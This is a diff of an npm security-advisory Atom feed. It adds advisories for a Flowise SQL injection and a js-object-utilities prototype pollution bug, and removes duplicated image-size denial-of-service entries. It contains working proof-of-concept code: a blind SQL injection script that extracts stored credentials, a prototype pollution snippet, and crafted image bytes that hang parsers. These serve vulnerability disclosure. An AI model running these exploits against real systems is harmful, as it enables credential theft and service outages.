@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2025-04-07T18:01:29.803Z</updated>
+    <updated>2025-04-07T19:01:14.784Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,358 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[flowise] FlowiseDB vulnerable to SQL Injection by authenticated users]]></title>
+        <id>https://github.com/advisories/GHSA-9c4c-g95m-c8cp</id>
+        <link href="https://github.com/advisories/GHSA-9c4c-g95m-c8cp"/>
+        <updated>2025-04-07T18:55:16.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>import functions are vulnerable.</p>
+<ul>
+<li><a href="https://github.com/FlowiseAI/Flowise/blob/main/packages/server/src/services/chatflows/index.ts#L219">importChatflows</a></li>
+<li><a href="https://github.com/FlowiseAI/Flowise/blob/main/packages/server/src/services/tools/index.ts#L85">importTools</a></li>
+<li><a href="https://github.com/FlowiseAI/Flowise/blob/main/packages/server/src/services/variables/index.ts">importVariables</a></li>
+</ul>
+<h3 id="details">Details</h3>
+<p><strong>Authenticated user</strong> can call importChatflows API, import json file such as <code>AllChatflows.json</code>.
+but Due to insufficient validation to chatflow.id in importChatflows API, 2 issues arise.</p>
+<p><strong>Issue 1 (Bug Type)</strong></p>
+<ol>
+<li>Malicious user creates <code>AllChatflows.json</code> file by adding <code>../</code> and arbitrary path to the chatflow.id of the json file.<pre><code class="language-json">{
+  "Chatflows": [
+    {
+      "id": "../../../../../../apikey",
+      "name": "clickme",
+      "flowData": "{}"
+    }
+  ]
+}
+</code></pre>
+</li>
+<li>Victim download this file, and import this to flowise.</li>
+<li>When victim click created chatflow, victim access to flowise:3000/canvas/{chatflow.id}.</li>
+</ol>
+<p><strong>Issue 2 (Vulnerability Type)</strong>
+importChatflows API use unsafe SQL Query.</p>
+<pre><code class="language-javascript">// packages/server/src/services/chatflows/index.ts
+const importChatflows = async (newChatflows: Partial&lt;ChatFlow&gt;[]): Promise&lt;any&gt; =&gt; {
+        try {
+        const appServer = getRunningExpressApp()
+
+        // step 1 - check whether file chatflows array is zero
+        if (newChatflows.length == 0) return
+
+        // step 2 - check whether ids are duplicate in database
+        let ids = '('
+        let count: number = 0
+        const lastCount = newChatflows.length - 1
+        newChatflows.forEach((newChatflow) =&gt; {
+            ids += `'${newChatflow.id}'`           // &lt;===== user input
+            if (lastCount != count) ids += ','
+            if (lastCount == count) ids += ')'
+            count += 1
+        })
+
+        const selectResponse = await appServer.AppDataSource.getRepository(ChatFlow)
+            .createQueryBuilder('cf')
+            .select('cf.id')
+            .where(`cf.id IN ${ids}`)                   // &lt;===== here
+            .getMany()
+        const foundIds = selectResponse.map((response) =&gt; {
+            return response.id
+        })
+</code></pre>
+<p>It changes like <code>SELECT cf.id FROM cf WHERE cf.id IN ('{USER-INPUT...}')</code> by the code above.
+When  <code>') {Malicious SQL Query} --</code> is passed to newChatflow.id, SQL Injection occurs.</p>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-python">import argparse
+import requests
+
+
+def import_chatflows(
+    url: str,
+    token: str,
+    payload: dict
+):
+    response = requests.post(
+        f'{url}/api/v1/chatflows/importchatflows',
+        headers={
+            'Authorization': f'Bearer {token}'
+            # 'Authorization': f'Basic {token}'
+        },
+        json=payload
+    )
+
+    return response.json()
+
+
+def import_normal_data(
+    api_url: str,
+    token: str,
+    normal_data: str
+):
+    data_id = 'aaaaaa'
+
+    payload = {
+        "Chatflows": [
+            {
+                "id": data_id,
+                "name": normal_data,
+                "flowData": "{}"
+            }
+        ]
+    }
+
+    import_chatflows(
+        url=api_url,
+        token=token,
+        payload=payload
+    )
+    return data_id
+
+
+def get_character(
+    api_url: str,
+    token: str,
+    data_id: str,
+    column_name: str,
+    index: int
+):
+    injection_query = f'(SELECT ascii(substr({column_name},{index},1)) FROM credential limit 0,1)'
+
+    def create_payload(
+        c: int
+    ):
+        return f"{data_id}') and if (({injection_query})&lt;{c}, 0, 9e300 * 9e300); -- "
+
+    chatflows_json = {
+        "Chatflows": [
+            {
+                "id": "",
+                "name": data_id,
+                "flowData": "{}"
+            }
+        ]
+    }
+
+    bitbox = [
+        64, 32, 16, 8, 4, 2, 1
+    ]
+    character = 0
+    for bit in bitbox:
+        payload = create_payload(c=character + bit)
+        chatflows_json['Chatflows'][0]['id'] = payload
+
+        res = import_chatflows(
+            url=api_url,
+            token=token,
+            payload=chatflows_json
+        )
+        if 'DOUBLE value is out of range' in res['message']:
+            # character is more then bit
+            character += bit
+        else:
+            # character is less then bit
+            character += 0
+
+    return chr(character)
+
+
+def get_length(
+    api_url: str,
+    token: str,
+    data_id: str,
+    column_name: str
+):
+    injection_query = f'(SELECT length({column_name}) FROM credential limit 0,1)'
+
+    def create_payload(
+        c: int
+    ):
+        return f"{data_id}') and if (({injection_query})&lt;{c}, 0, 9e300 * 9e300); -- "
+
+    chatflows_json = {
+        "Chatflows": [
+            {
+                "id": "",
+                "name": data_id,
+                "flowData": "{}"
+            }
+        ]
+    }
+
+    column_len = 0
+    bitbox = [
+        256, 128, 64, 32, 16, 8, 4, 2, 1
+    ]
+    for bit in bitbox:
+        payload = create_payload(c=column_len + bit)
+        chatflows_json['Chatflows'][0]['id'] = payload
+
+        res = import_chatflows(
+            url=api_url,
+            token=token,
+            payload=chatflows_json
+        )
+        if 'DOUBLE value is out of range' in res['message']:
+            # column_len is more then bit
+            column_len += bit
+        else:
+            # column_len is less then bit
+            column_len += 0
+
+    return column_len
+
+
+def main(
+    url: str,
+    token: str
+):
+    api_url = url
+
+    column_box = [
+        'credentialName',
+        'encryptedData'
+    ]
+
+    data_id = import_normal_data(
+        api_url=api_url,
+        token=token,
+        normal_data='flow01'
+    )
+
+    for column_name in column_box:
+        column_len = get_length(
+            api_url=api_url,
+            token=token,
+            data_id=data_id,
+            column_name=column_name
+        )
+
+        print(f'[+] {column_name} length is {column_len}')
+
+        result = ''
+        for i in range(column_len):
+            result += get_character(
+                api_url=api_url,
+                token=token,
+                data_id=data_id,
+                column_name=column_name,
+                index=i + 1
+            )
+
+        print(f'[+] {column_name}: {result}')
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.add_argument(
+        '--url',
+        type=str,
+        default='http://flowise:3000'
+    )
+    parser.add_argument(
+        '--access',
+        type=str,
+        required=True,
+        help='Get from http://flowise:3000/apikey'
+    )
+
+    m_args = parser.parse_args()
+
+    main(
+        url=m_args.url,
+        token=m_args.access
+    )
+</code></pre>
+<p><strong>poc results: encryptedData from flowise database credential table was successfully leaked.</strong></p>
+<pre><code>/app # python ex2.py --url http://flowise:3000 --access "blahblah~~~"
+[+] credentialName length is 9
+[+] credentialName: openAIApi
+[+] encryptedData length is 88
+[+] encryptedData: U2FsdGVkX19LlIhbD4M9q9reLWQilBY6ffWo2S9PQ669CP1HpMPa5g1h1rJL0ZK3x0UMsLi/8Pz6TbSFrmIZbg==
+</code></pre>
+<p>It is recommended to limit all chatflow ids &amp; chat ids to UUID.</p>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>Database leak</li>
+<li>Lateral Movement</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-9c4c-g95m-c8cp">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-9c4c-g95m-c8cp</a></li>
+<li><a href="https://github.com/FlowiseAI/Flowise/pull/4226">https://github.com/FlowiseAI/Flowise/pull/4226</a></li>
+<li><a href="https://github.com/advisories/GHSA-9c4c-g95m-c8cp">https://github.com/advisories/GHSA-9c4c-g95m-c8cp</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9c4c-g95m-c8cp</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2025-04-07T18:55:13.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[js-object-utilities] js-object-utilities Vulnerable to Prototype Pollution]]></title>
+        <id>https://github.com/advisories/GHSA-hpqf-m68j-2pfx</id>
+        <link href="https://github.com/advisories/GHSA-hpqf-m68j-2pfx"/>
+        <updated>2025-04-07T18:52:05.000Z</updated>
+        <content type="html"><![CDATA[<p><strong>Vulnerability type:</strong>
+Prototype Pollution</p>
+<p><strong>Affected Package:</strong></p>
+<ul>
+<li>Product: js-object-utilities</li>
+<li>Version: 2.2.0</li>
+</ul>
+<p><strong>Remedy:</strong></p>
+<p>Update package to version 2.2.1.</p>
+<p><strong>Vulnerability Location(s):</strong></p>
+<pre><code class="language-js">at module.exports (/node_modules/js-object-utilities/dist/set.js:16:29)
+</code></pre>
+<p><strong>Description:</strong></p>
+<p>The latest version of <code>js-object-utilities (2.2.0)</code>, (previous versions are also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>lib.set</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>
+<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
+<p><strong>PoC:</strong></p>
+<pre><code class="language-bash">// install the package with the latest version
+~$ npm install js-object-utilities@2.2.0
+// run the script mentioned below 
+~$ node poc.js
+//The expected output (if the code still vulnerable) is below. 
+// Note that the output may slightly differs from function to another.
+Before Attack:  {}
+After Attack:  {"pollutedKey":123}
+</code></pre>
+<pre><code class="language-js">// poc.js
+(async () =&gt; {
+    const lib = await import('js-object-utilities');
+    var someObj = {}
+    console.log("Before Attack: ", JSON.stringify({}.__proto__));
+    try {
+        // for multiple functions, uncomment only one for each execution.
+        Reflect.apply(lib.set, {}, [someObj, "__proto__.pollutedKey", 123]);
+    } catch (e) { }
+    console.log("After Attack: ", JSON.stringify({}.__proto__));
+    delete Object.prototype.pollutedKey;
+})();
+</code></pre>
+<p><strong>Reporter Credit:</strong></p>
+<p>Tariq Hawis</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/rrainn/js-object-utilities/security/advisories/GHSA-hpqf-m68j-2pfx">https://github.com/rrainn/js-object-utilities/security/advisories/GHSA-hpqf-m68j-2pfx</a></li>
+<li><a href="https://github.com/rrainn/js-object-utilities/commit/05ca694207270b7de275767f3fc93a2a643692a7">https://github.com/rrainn/js-object-utilities/commit/05ca694207270b7de275767f3fc93a2a643692a7</a></li>
+<li><a href="https://github.com/advisories/GHSA-hpqf-m68j-2pfx">https://github.com/advisories/GHSA-hpqf-m68j-2pfx</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hpqf-m68j-2pfx</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2025-04-07T18:52:04.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[tarteaucitronjs] tarteaucitron.js allows url scheme injection via unfiltered inputs]]></title>
         <id>https://github.com/advisories/GHSA-p5g4-v748-6fh8</id>
@@ -623,533 +975,5 @@ The plugin now differentiates between an unset scope and an explicit validation 
         </author>
         <category label="severity" term="LOW"/>
         <published>2025-04-02T22:35:37.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[image-size] image-size Denial of Service via Infinite Loop during Image Processing]]></title>
-        <id>https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</id>
-        <link href="https://github.com/advisories/GHSA-m5qc-5hw7-8vg7"/>
-        <updated>2025-04-02T15:04:59.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>image-size</code> is vulnerable to a Denial of Service vulnerability when processing specially crafted images.</p>
-<p>The issue occurs because of an infine loop in <code>findBox</code> when processing certain images with a box with size <code>0</code>.</p>
-<h3 id="details">Details</h3>
-<p>If the first bytes of the input does not match any bytes in <code>firstBytes</code>, then the package tries to validate the image using other handlers:</p>
-<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/detector.ts#L20-L31
-export function detector(input: Uint8Array): imageType | undefined {
-  const byte = input[0]
-  if (byte in firstBytes) {
-    const type = firstBytes[byte]
-    if (type &amp;&amp; typeHandlers[type].validate(input)) {
-      return type
-    }
-  }
-
-  const finder = (key: imageType) =&gt; typeHandlers[key].validate(input) //&lt;--
-  return keys.find(finder)
-}
-</code></pre>
-<p>Some handlers that call <code>findBox</code> to validate or calculate the image size are <code>jxl</code>, <code>heif</code> and <code>jp2</code>.</p>
-<p><code>JXL</code> handler calls <code>findBox</code> inside <code>validate</code>. To reach the <code>findBox</code> call, the value at position <code>4:8</code> should be <code>'JXL '</code></p>
-<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jxl.ts#L51-L60
-export const JXL: IImage = {
-  validate: (input: Uint8Array): boolean =&gt; {
-    const boxType = toUTF8String(input, 4, 8)
-    if (boxType !== 'JXL ') return false      //&lt;---
-
-    const ftypBox = findBox(input, 'ftyp', 0) //&lt;---
-    if (!ftypBox) return false
-
-    const brand = toUTF8String(input, ftypBox.offset + 8, ftypBox.offset + 12)
-    return brand === 'jxl '
-  },
-</code></pre>
-<p><code>findBox</code> can lead to an infine loop because the value of <code>box.size</code> is <code>0</code>, thus the <code>offset</code> variable is not updated. Below relevant code with comments (using one of the <code>PAYLOAD</code> below as example):</p>
-<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L33-L37
-export const readUInt32BE = (input: Uint8Array, offset = 0) =&gt;
-  input[offset] * 2 ** 24 +     // 0 +
-  input[offset + 1] * 2 ** 16 + // 0 +
-  input[offset + 2] * 2 ** 8 +  // 0 +
-  input[offset + 3]             // 0
-
-// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L66-L75
-function readBox(input: Uint8Array, offset: number) {   // offset: 0
-  if (input.length - offset &lt; 4) return
-  const boxSize = readUInt32BE(input, offset)           // 0
-  if (input.length - offset &lt; boxSize) return           // (8 - 0) &lt; 0 =&gt; false
-  return {
-    name: toUTF8String(input, 4 + offset, 8 + offset),  // 'JXL '
-    offset,                                             // 0
-    size: boxSize,                                      // 0
-  }
-}
-
-// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L77-L84
-export function findBox(input: Uint8Array, boxName: string, offset: number) { // boxName: 'ftyp', offset: 0
-  while (offset &lt; input.length) {         // 0 &lt; 8 =&gt; false
-    const box = readBox(input, offset)    // { name: 'JXL ', offset: 0, size: 0 }
-    if (!box) break                       // false
-    if (box.name === boxName) return box  // 'JXL ' === 'ftyp' =&gt; false
-    offset += box.size                    // offset += 0
-  }
-}
-</code></pre>
-<p>A similar issue occurs for <code>HEIF</code> and <code>JP2</code> handlers:</p>
-<ul>
-<li><a href="https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts">https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts</a></li>
-<li><a href="https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts">https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts</a></li>
-</ul>
-<h3 id="poc">PoC</h3>
-<p>Usage:</p>
-<pre><code class="language-bash">node main.js poc1|poc2
-</code></pre>
-<ul>
-<li>poc for <code>image-size@2.0.1</code></li>
-</ul>
-<pre><code class="language-js">// mkdir 2.0.1
-// cd 2.0.1/
-// npm i image-size@2.0.1
-const {imageSizeFromFile} = require("image-size/fromFile");
-const {imageSize} = require("image-size");
-
-const fs = require('fs');
-
-// JXL
-const PAYLOAD = new Uint8Array([
-  0x00, 0x00, 0x00, 0x00, // Box with size 0
-  0x4A, 0x58, 0x4C, 0x20, // "JXL "
-]);
-
-// HEIF
-// const PAYLOAD = new Uint8Array([
-//   0x00, 0x00, 0x00, 0x00, // Box with size 0
-//   0x66, 0x74, 0x79, 0x70, // "ftyp"
-//   0x61, 0x76, 0x69, 0x66  // "avif"
-// ]);
-
-// JP2
-// const PAYLOAD = new Uint8Array([
-//   0x00, 0x00, 0x00, 0x00, // Box with size 0
-//   0x6A, 0x50, 0x20, 0x20, // "jP  "
-// ]);
-
-const FILENAME = "./poc.svg"
-
-function createPayload() {
-  fs.writeFileSync(FILENAME, PAYLOAD);
-}
-
-function poc1() { 
-  (async () =&gt; {
-    await imageSizeFromFile(FILENAME)
-    console.log('Done') // never executed
-  })();
-}
-
-function poc2() {
-  imageSize(PAYLOAD)
-  console.log('Done') // never executed
-}
-
-const pocs = new Map();
-pocs.set('poc1', poc1); // node main.js poc1
-pocs.set('poc2', poc2); // node main.js poc2
-
-async function run() {
-  createPayload()
-  const args = process.argv.slice(2);
-  const t = args[0];
-  const poc = pocs.get(t) || poc1;
-  console.log(`Running poc....`)
-  await poc();
-}
-
-run();
-</code></pre>
-<ul>
-<li>poc for <code>image-size@1.2.0</code></li>
-</ul>
-<pre><code class="language-js">// mkdir 1.2.0
-// cd 1.2.0/
-// npm i image-size@1.2.0
-const sizeOf = require("image-size");
-const fs = require('fs');
-
-// JXL
-const PAYLOAD = new Uint8Array([
-  0x00, 0x00, 0x00, 0x00, // Box with size 0
-  0x4A, 0x58, 0x4C, 0x20, // "JXL "
-]);
-
-// HEIF
-// const PAYLOAD = new Uint8Array([
-//   0x00, 0x00, 0x00, 0x00, // Box with size 0
-//   0x66, 0x74, 0x79, 0x70, // "ftyp"
-//   0x61, 0x76, 0x69, 0x66  // "avif"
-// ]);
-
-// JP2
-// const PAYLOAD = new Uint8Array([
-//   0x00, 0x00, 0x00, 0x00, // Box with size 0
-//   0x6A, 0x50, 0x20, 0x20, // "jP  "
-// ]);
-
-const FILENAME = "./poc.svg"
-
-function createPayload() {
-  fs.writeFileSync(FILENAME, PAYLOAD);
-}
-
-function poc1() {
-  sizeOf(FILENAME)
-  console.log('Done') // never executed
-}
-
-function poc2() {
-  sizeOf(PAYLOAD)
-  console.log('Done') // never executed
-}
-
-const pocs = new Map();
-pocs.set('poc1', poc1); // node main.js poc1
-pocs.set('poc2', poc2); // node main.js poc2
-
-async function run() {
-  createPayload()
-  const args = process.argv.slice(2);
-  const t = args[0];
-  const poc = pocs.get(t) || poc1;
-  console.log(`Running poc....`)
-  await poc();
-}
-
-run();
-</code></pre>
-<ul>
-<li>poc for <code>image-size@1.1.1</code></li>
-</ul>
-<pre><code class="language-js">// mkdir 1.1.1
-// cd 1.1.1/
-// npm i image-size@1.1.1
-const sizeOf = require("image-size");
-const fs = require('fs');
-
-// HEIF
-const PAYLOAD = new Uint8Array([
-  0x00, 0x00, 0x00, 0x00, // Box with size 0
-  0x66, 0x74, 0x79, 0x70, // "ftyp"
-  0x61, 0x76, 0x69, 0x66  // "avif"
-]);
-
-const FILENAME = "./poc.svg"
-
-function createPayload() {
-  fs.writeFileSync(FILENAME, PAYLOAD);
-}
-
-function poc1() {
-  sizeOf(FILENAME)
-  console.log('Done') // never executed
-}
-
-function poc2() {
-  sizeOf(PAYLOAD)
-  console.log('Done') // never executed
-}
-
-const pocs = new Map();
-pocs.set('poc1', poc1); // node main.js poc1
-pocs.set('poc2', poc2); // node main.js poc2
-
-async function run() {
-  createPayload()
-  const args = process.argv.slice(2);
-  const t = args[0];
-  const poc = pocs.get(t) || poc1;
-  console.log(`Running poc....`)
-  await poc();
-}
-
-run();
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Denial of Service</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7">https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7</a></li>
-<li><a href="https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68">https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68</a></li>
-<li><a href="https://github.com/advisories/GHSA-m5qc-5hw7-8vg7">https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-04-02T15:04:58.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[image-size] image-size Denial of Service via Infinite Loop during Image Processing]]></title>
-        <id>https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</id>
-        <link href="https://github.com/advisories/GHSA-m5qc-5hw7-8vg7"/>
-        <updated>2025-04-02T15:04:59.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>image-size</code> is vulnerable to a Denial of Service vulnerability when processing specially crafted images.</p>
-<p>The issue occurs because of an infine loop in <code>findBox</code> when processing certain images with a box with size <code>0</code>.</p>
-<h3 id="details">Details</h3>
-<p>If the first bytes of the input does not match any bytes in <code>firstBytes</code>, then the package tries to validate the image using other handlers:</p>
-<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/detector.ts#L20-L31
-export function detector(input: Uint8Array): imageType | undefined {
-  const byte = input[0]
-  if (byte in firstBytes) {
-    const type = firstBytes[byte]
-    if (type &amp;&amp; typeHandlers[type].validate(input)) {
-      return type
-    }
-  }
-
-  const finder = (key: imageType) =&gt; typeHandlers[key].validate(input) //&lt;--
-  return keys.find(finder)
-}
-</code></pre>
-<p>Some handlers that call <code>findBox</code> to validate or calculate the image size are <code>jxl</code>, <code>heif</code> and <code>jp2</code>.</p>
-<p><code>JXL</code> handler calls <code>findBox</code> inside <code>validate</code>. To reach the <code>findBox</code> call, the value at position <code>4:8</code> should be <code>'JXL '</code></p>
-<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jxl.ts#L51-L60
-export const JXL: IImage = {
-  validate: (input: Uint8Array): boolean =&gt; {
-    const boxType = toUTF8String(input, 4, 8)
-    if (boxType !== 'JXL ') return false      //&lt;---
-
-    const ftypBox = findBox(input, 'ftyp', 0) //&lt;---
-    if (!ftypBox) return false
-
-    const brand = toUTF8String(input, ftypBox.offset + 8, ftypBox.offset + 12)
-    return brand === 'jxl '
-  },
-</code></pre>
-<p><code>findBox</code> can lead to an infine loop because the value of <code>box.size</code> is <code>0</code>, thus the <code>offset</code> variable is not updated. Below relevant code with comments (using one of the <code>PAYLOAD</code> below as example):</p>
-<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L33-L37
-export const readUInt32BE = (input: Uint8Array, offset = 0) =&gt;
-  input[offset] * 2 ** 24 +     // 0 +
-  input[offset + 1] * 2 ** 16 + // 0 +
-  input[offset + 2] * 2 ** 8 +  // 0 +
-  input[offset + 3]             // 0
-
-// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L66-L75
-function readBox(input: Uint8Array, offset: number) {   // offset: 0
-  if (input.length - offset &lt; 4) return
-  const boxSize = readUInt32BE(input, offset)           // 0
-  if (input.length - offset &lt; boxSize) return           // (8 - 0) &lt; 0 =&gt; false
-  return {
-    name: toUTF8String(input, 4 + offset, 8 + offset),  // 'JXL '
-    offset,                                             // 0
-    size: boxSize,                                      // 0
-  }
-}
-
-// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L77-L84
-export function findBox(input: Uint8Array, boxName: string, offset: number) { // boxName: 'ftyp', offset: 0
-  while (offset &lt; input.length) {         // 0 &lt; 8 =&gt; false
-    const box = readBox(input, offset)    // { name: 'JXL ', offset: 0, size: 0 }
-    if (!box) break                       // false
-    if (box.name === boxName) return box  // 'JXL ' === 'ftyp' =&gt; false
-    offset += box.size                    // offset += 0
-  }
-}
-</code></pre>
-<p>A similar issue occurs for <code>HEIF</code> and <code>JP2</code> handlers:</p>
-<ul>
-<li><a href="https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts">https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts</a></li>
-<li><a href="https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts">https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts</a></li>
-</ul>
-<h3 id="poc">PoC</h3>
-<p>Usage:</p>
-<pre><code class="language-bash">node main.js poc1|poc2
-</code></pre>
-<ul>
-<li>poc for <code>image-size@2.0.1</code></li>
-</ul>
-<pre><code class="language-js">// mkdir 2.0.1
-// cd 2.0.1/
-// npm i image-size@2.0.1
-const {imageSizeFromFile} = require("image-size/fromFile");
-const {imageSize} = require("image-size");
-
-const fs = require('fs');
-
-// JXL
-const PAYLOAD = new Uint8Array([
-  0x00, 0x00, 0x00, 0x00, // Box with size 0
-  0x4A, 0x58, 0x4C, 0x20, // "JXL "
-]);
-
-// HEIF
-// const PAYLOAD = new Uint8Array([
-//   0x00, 0x00, 0x00, 0x00, // Box with size 0
-//   0x66, 0x74, 0x79, 0x70, // "ftyp"
-//   0x61, 0x76, 0x69, 0x66  // "avif"
-// ]);
-
-// JP2
-// const PAYLOAD = new Uint8Array([
-//   0x00, 0x00, 0x00, 0x00, // Box with size 0
-//   0x6A, 0x50, 0x20, 0x20, // "jP  "
-// ]);
-
-const FILENAME = "./poc.svg"
-
-function createPayload() {
-  fs.writeFileSync(FILENAME, PAYLOAD);
-}
-
-function poc1() { 
-  (async () =&gt; {
-    await imageSizeFromFile(FILENAME)
-    console.log('Done') // never executed
-  })();
-}
-
-function poc2() {
-  imageSize(PAYLOAD)
-  console.log('Done') // never executed
-}
-
-const pocs = new Map();
-pocs.set('poc1', poc1); // node main.js poc1
-pocs.set('poc2', poc2); // node main.js poc2
-
-async function run() {
-  createPayload()
-  const args = process.argv.slice(2);
-  const t = args[0];
-  const poc = pocs.get(t) || poc1;
-  console.log(`Running poc....`)
-  await poc();
-}
-
-run();
-</code></pre>
-<ul>
-<li>poc for <code>image-size@1.2.0</code></li>
-</ul>
-<pre><code class="language-js">// mkdir 1.2.0
-// cd 1.2.0/
-// npm i image-size@1.2.0
-const sizeOf = require("image-size");
-const fs = require('fs');
-
-// JXL
-const PAYLOAD = new Uint8Array([
-  0x00, 0x00, 0x00, 0x00, // Box with size 0
-  0x4A, 0x58, 0x4C, 0x20, // "JXL "
-]);
-
-// HEIF
-// const PAYLOAD = new Uint8Array([
-//   0x00, 0x00, 0x00, 0x00, // Box with size 0
-//   0x66, 0x74, 0x79, 0x70, // "ftyp"
-//   0x61, 0x76, 0x69, 0x66  // "avif"
-// ]);
-
-// JP2
-// const PAYLOAD = new Uint8Array([
-//   0x00, 0x00, 0x00, 0x00, // Box with size 0
-//   0x6A, 0x50, 0x20, 0x20, // "jP  "
-// ]);
-
-const FILENAME = "./poc.svg"
-
-function createPayload() {
-  fs.writeFileSync(FILENAME, PAYLOAD);
-}
-
-function poc1() {
-  sizeOf(FILENAME)
-  console.log('Done') // never executed
-}
-
-function poc2() {
-  sizeOf(PAYLOAD)
-  console.log('Done') // never executed
-}
-
-const pocs = new Map();
-pocs.set('poc1', poc1); // node main.js poc1
-pocs.set('poc2', poc2); // node main.js poc2
-
-async function run() {
-  createPayload()
-  const args = process.argv.slice(2);
-  const t = args[0];
-  const poc = pocs.get(t) || poc1;
-  console.log(`Running poc....`)
-  await poc();
-}
-
-run();
-</code></pre>
-<ul>
-<li>poc for <code>image-size@1.1.1</code></li>
-</ul>
-<pre><code class="language-js">// mkdir 1.1.1
-// cd 1.1.1/
-// npm i image-size@1.1.1
-const sizeOf = require("image-size");
-const fs = require('fs');
-
-// HEIF
-const PAYLOAD = new Uint8Array([
-  0x00, 0x00, 0x00, 0x00, // Box with size 0
-  0x66, 0x74, 0x79, 0x70, // "ftyp"
-  0x61, 0x76, 0x69, 0x66  // "avif"
-]);
-
-const FILENAME = "./poc.svg"
-
-function createPayload() {
-  fs.writeFileSync(FILENAME, PAYLOAD);
-}
-
-function poc1() {
-  sizeOf(FILENAME)
-  console.log('Done') // never executed
-}
-
-function poc2() {
-  sizeOf(PAYLOAD)
-  console.log('Done') // never executed
-}
-
-const pocs = new Map();
-pocs.set('poc1', poc1); // node main.js poc1
-pocs.set('poc2', poc2); // node main.js poc2
-
-async function run() {
-  createPayload()
-  const args = process.argv.slice(2);
-  const t = args[0];
-  const poc = pocs.get(t) || poc1;
-  console.log(`Running poc....`)
-  await poc();
-}
-
-run();
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Denial of Service</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7">https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7</a></li>
-<li><a href="https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68">https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68</a></li>
-<li><a href="https://github.com/advisories/GHSA-m5qc-5hw7-8vg7">https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-04-02T15:04:58.000Z</published>
     </entry>
